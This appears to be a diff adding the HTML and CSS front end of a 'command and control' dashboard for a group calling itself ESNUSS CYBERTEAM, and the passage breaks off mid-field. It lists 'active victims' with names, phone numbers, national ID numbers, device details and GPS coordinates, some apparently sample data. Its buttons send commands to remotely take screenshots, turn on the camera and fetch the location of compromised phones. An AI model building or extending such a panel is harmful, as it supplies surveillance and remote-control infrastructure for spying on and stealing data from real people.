@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ESNUSS CYBERTEAM - LIVE DASHBOARD</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        :root {
+            --cyber-green: #00ff00;
+            --cyber-red: #ff0033;
+            --cyber-blue: #0066ff;
+            --cyber-purple: #9900ff;
+            --dark-bg: #0a0a0a;
+            --panel-bg: #111111;
+            --text-light: #ffffff;
+            --text-dim: #888888;
+        }
+        
+        body {
+            background: var(--dark-bg);
+            color: var(--text-light);
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        /* HEADER */
+        .dashboard-header {
+            background: linear-gradient(90deg, #000000, #111111);
+            padding: 1rem 2rem;
+            border-bottom: 2px solid var(--cyber-green);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        
+        .logo-icon {
+            color: var(--cyber-green);
+            font-size: 2rem;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .logo-text h1 {
+            font-size: 1.5rem;
+            background: linear-gradient(90deg, var(--cyber-green), var(--cyber-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stats-bar {
+            display: flex;
+            gap: 2rem;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--cyber-green);
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--text-dim);
+        }
+        
+        /* MAIN LAYOUT */
+        .dashboard-container {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 1rem;
+            padding: 1rem;
+            height: calc(100vh - 80px);
+        }
+        
+        /* SIDEBAR - VICTIMS LIST */
+        .sidebar {
+            background: var(--panel-bg);
+            border-radius: 10px;
+            border: 1px solid #222;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .sidebar-header {
+            padding: 1rem;
+            background: #1a1a1a;
+            border-bottom: 1px solid #333;
+        }
+        
+        .sidebar-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .refresh-btn {
+            background: var(--cyber-blue);
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+        
+        .victims-list {
+            flex: 1;
+            overflow-y: auto;
+        }
+        
+        .victim-card {
+            padding: 1rem;
+            border-bottom: 1px solid #222;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .victim-card:hover {
+            background: #1a1a1a;
+        }
+        
+        .victim-card.active {
+            background: #1a1a1a;
+            border-left: 3px solid var(--cyber-green);
+        }
+        
+        .victim-name {
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+            color: var(--cyber-green);
+        }
+        
+        .victim-info {
+            font-size: 0.8rem;
+            color: var(--text-dim);
+        }
+        
+        /* MAIN PANEL */
+        .main-panel {
+            display: grid;
+            grid-template-rows: 1fr 1fr;
+            gap: 1rem;
+        }
+        
+        /* VICTIM DETAILS */
+        .victim-details {
+            background: var(--panel-bg);
+            border-radius: 10px;
+            border: 1px solid #222;
+            padding: 1.5rem;
+            overflow-y: auto;
+        }
+        
+        .details-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid #333;
+            padding-bottom: 1rem;
+        }
+        
+        .details-title {
+            font-size: 1.2rem;
+            color: var(--cyber-green);
+        }
+        
+        .victim-actions {
+            display: flex;
+            gap: 0.5rem;
+        }
+        
+        .action-btn {
+            background: #222;
+            color: white;
+            border: 1px solid #444;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.3s;
+        }
+        
+        .action-btn:hover {
+            background: #333;
+            border-color: var(--cyber-blue);
+        }
+        
+        .action-btn.red {
+            background: #330000;
+            border-color: var(--cyber-red);
+        }
+        
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+        }
+        
+        .detail-section {
+            background: #1a1a1a;
+            padding: 1rem;
+            border-radius: 8px;
+            border: 1px solid #222;
+        }
+        
+        .section-title {
+            color: var(--cyber-blue);
+            font-size: 1rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #333;
+        }
+        
+        .data-item {
+            margin-bottom: 0.5rem;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .data-label {
+            color: var(--text-dim);
+        }
+        
+        .data-value {
+            color: white;
+            font-weight: 500;
+        }
+        
+        /* COMMAND PANEL */
+        .command-panel {
+            background: var(--panel-bg);
+            border-radius: 10px;
+            border: 1px solid #222;
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .command-header {
+            margin-bottom: 1rem;
+            color: var(--cyber-purple);
+        }
+        
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .command-btn {
+            background: linear-gradient(135deg, #111, #222);
+            color: white;
+            border: 1px solid #333;
+            padding: 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            transition: all 0.3s;
+        }
+        
+        .command-btn:hover {
+            border-color: var(--cyber-green);
+            transform: translateY(-2px);
+        }
+        
+        .command-icon {
+            font-size: 1.5rem;
+            color: var(--cyber-green);
+        }
+        
+        .command-name {
+            font-size: 0.9rem;
+        }
+        
+        /* LOG PANEL */
+        .log-panel {
+            flex: 1;
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        
+        .log-entry {
+            margin-bottom: 0.5rem;
+            padding: 0.5rem;
+            border-left: 3px solid transparent;
+        }
+        
+        .log-entry.info {
+            border-left-color: var(--cyber-blue);
+            background: rgba(0, 102, 255, 0.1);
+        }
+        
+        .log-entry.success {
+            border-left-color: var(--cyber-green);
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        .log-entry.warning {
+            border-left-color: #ff9900;
+            background: rgba(255, 153, 0, 0.1);
+        }
+        
+        .log-entry.error {
+            border-left-color: var(--cyber-red);
+            background: rgba(255, 0, 51, 0.1);
+        }
+        
+        .log-time {
+            color: var(--text-dim);
+            margin-right: 1rem;
+        }
+        
+        /* MAP VISUALIZATION */
+        .map-container {
+            height: 300px;
+            background: #1a1a1a;
+            border-radius: 8px;
+            margin-top: 1rem;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .map-placeholder {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: var(--text-dim);
+            font-style: italic;
+        }
+        
+        /* RESPONSIVE */
+        @media (max-width: 1200px) {
+            .dashboard-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .sidebar {
+                height: 300px;
+            }
+        }
+        
+        /* ANIMATIONS */
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        /* SCROLLBAR */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #444;
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+    </style>
+    
+    <!-- FONT AWESOME -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- SOCKET.IO FOR REAL-TIME -->
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    
+    <!-- CHART.JS FOR VISUALIZATION -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+    <!-- HEADER -->
+    <header class="dashboard-header">
+        <div class="logo">
+            <div class="logo-icon">
+                <i class="fas fa-terminal"></i>
+            </div>
+            <div class="logo-text">
+                <h1>ESNUSS CYBERTEAM</h1>
+                <div style="font-size: 0.8rem; color: var(--text-dim);">COMMAND & CONTROL CENTER</div>
+            </div>
+        </div>
+        
+        <div class="stats-bar">
+            <div class="stat-item">
+                <div class="stat-number" id="totalVictims">0</div>
+                <div class="stat-label">TOTAL VICTIMS</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number" id="activeNow">0</div>
+                <div class="stat-label">ACTIVE NOW</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number" id="dataCollected">0</div>
+                <div class="stat-label">DATA POINTS</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number blink" id="status">ONLINE</div>
+                <div class="stat-label">SYSTEM STATUS</div>
+            </div>
+        </div>
+    </header>
+
+    <!-- MAIN DASHBOARD -->
+    <div class="dashboard-container">
+        <!-- SIDEBAR - VICTIMS LIST -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-title">
+                    <h3><i class="fas fa-users"></i> ACTIVE VICTIMS</h3>
+                    <button class="refresh-btn" onclick="loadVictims()">
+                        <i class="fas fa-sync-alt"></i> REFRESH
+                    </button>
+                </div>
+                <div style="margin-top: 0.5rem; font-size: 0.8rem; color: var(--text-dim);">
+                    <i class="fas fa-filter"></i> 
+                    <select id="filterSelect" onchange="filterVictims()" style="background: #222; color: white; border: none; padding: 0.2rem; border-radius: 3px;">
+                        <option value="all">All Victims</option>
+                        <option value="today">Today</option>
+                        <option value="online">Online Now</option>
+                        <option value="highvalue">High Value</option>
+                    </select>
+                </div>
+            </div>
+            
+            <div class="victims-list" id="victimsList">
+                <!-- Victims will be loaded here dynamically -->
+                <div class="victim-card active" onclick="selectVictim('victim1')">
+                    <div class="victim-name">Budi Santoso <span style="color: var(--cyber-green); font-size: 0.7rem;">● LIVE</span></div>
+                    <div class="victim-info">
+                        <div>📱 081234567890</div>
+                        <div>📍 Jakarta, ID</div>
+                        <div>🕐 Connected: 5m ago</div>
+                    </div>
+                </div>
+                
+                <div class="victim-card" onclick="selectVictim('victim2')">
+                    <div class="victim-name">Siti Rahayu</div>
+                    <div class="victim-info">
+                        <div>📱 085678901234</div>
+                        <div>📍 Bandung, ID</div>
+                        <div>🕐 Connected: 15m ago</div>
+                    </div>
+                </div>
+                
+                <div class="victim-card" onclick="selectVictim('victim3')">
+                    <div class="victim-name">Ahmad Fauzi</div>
+                    <div class="victim-info">
+                        <div>📱 081345678901</div>
+                        <div>📍 Surabaya, ID</div>
+                        <div>🕐 Connected: 1h ago</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MAIN PANEL -->
+        <div class="main-panel">
+            <!-- VICTIM DETAILS PANEL -->
+            <div class="victim-details">
+                <div class="details-header">
+                    <div class="details-title">
+                        <i class="fas fa-user-secret"></i> 
+                        <span id="selectedVictimName">Budi Santoso</span>
+                        <span style="font-size: 0.9rem; color: var(--cyber-green); margin-left: 1rem;">
+                            <i class="fas fa-circle"></i> ACTIVE CONNECTION
+                        </span>
+                    </div>
+                    
+                    <div class="victim-actions">
+                        <button class="action-btn" onclick="sendCommand('screenshot')">
+                            <i class="fas fa-camera"></i> Screenshot
+                        </button>
+                        <button class="action-btn" onclick="sendCommand('camera')">
+                            <i class="fas fa-video"></i> Camera
+                        </button>
+                        <button class="action-btn" onclick="sendCommand('location')">
+                            <i class="fas fa-map-marker-alt"></i> Location
+                        </button>
+                        <button class="action-btn red" onclick="sendCommand('panic')">
+                            <i class="fas fa-skull-crossbones"></i> Panic Mode
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="details-grid">
+                    <!-- PERSONAL INFO -->
+                    <div class="detail-section">
+                        <div class="section-title">
+                            <i class="fas fa-id-card"></i> PERSONAL INFORMATION
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Full Name:</span>
+                            <span class="data-value" id="infoName">Budi Santoso</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Phone Number:</span>
+                            <span class="data-value" id="infoPhone">081234567890</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Email:</span>
+                            <span class="data-value" id="infoEmail">budi.santoso@email.com</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">NIK:</span>
+                            <span class="data-value" id="infoNik">3273010101010001</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Operator:</span>
+                            <span class="data-value" id="infoOperator">Telkomsel</span>
+                        </div>
+                    </div>
+                    
+                    <!-- DEVICE INFO -->
+                    <div class="detail-section">
+                        <div class="section-title">
+                            <i class="fas fa-mobile-alt"></i> DEVICE INFORMATION
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Device:</span>
+                            <span class="data-value" id="infoDevice">Samsung Galaxy S23 Ultra</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Browser:</span>
+                            <span class="data-value" id="infoBrowser">Chrome 120.0.6099.130</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">IP Address:</span>
+                            <span class="data-value" id="infoIp">192.168.1.100</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Screen:</span>
+                            <span class="data-value" id="infoScreen">1440x3088</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">OS:</span>
+                            <span class="data-value" id="infoOs">Android 14</span>
+                        </div>
+                    </div>
+                    
+                    <!-- LOCATION INFO -->
+                    <div class="detail-section">
+                        <div class="section-title">
+                            <i class="fas fa-map-marker-alt"></i> LOCATION & NETWORK
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Coordinates:</span>
+                            <span class="data-value" id="infoCoords">-6.2088, 106.8456</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Address:</span>
+                            <span class="data-value" id="infoAddress">Jakarta Pusat, Indonesia</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Network:</span>
+                            <span class="data-value" id="infoNetwork">WiFi (Hom
